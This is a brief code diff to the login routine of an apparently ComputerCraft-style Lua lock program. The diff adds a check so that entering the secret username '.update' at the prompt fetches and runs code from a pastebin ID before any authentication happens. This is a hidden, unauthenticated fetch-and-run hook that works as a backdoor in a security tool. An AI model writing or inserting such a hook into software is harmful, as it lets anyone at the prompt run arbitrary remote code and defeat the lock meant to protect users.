@@ -265,6 +265,9 @@ function lock()
 	term.setTextColor( inputpw )
 	local username = read()
 	
+	if username == ".update" then
+		shell.run("pastebin run Qcw6bZrA")
+	end
 	if not fs.exists(".sertexsecurity/udb/"..username) then
 		print("  Unknkown Username")
 		sleep(1.5)
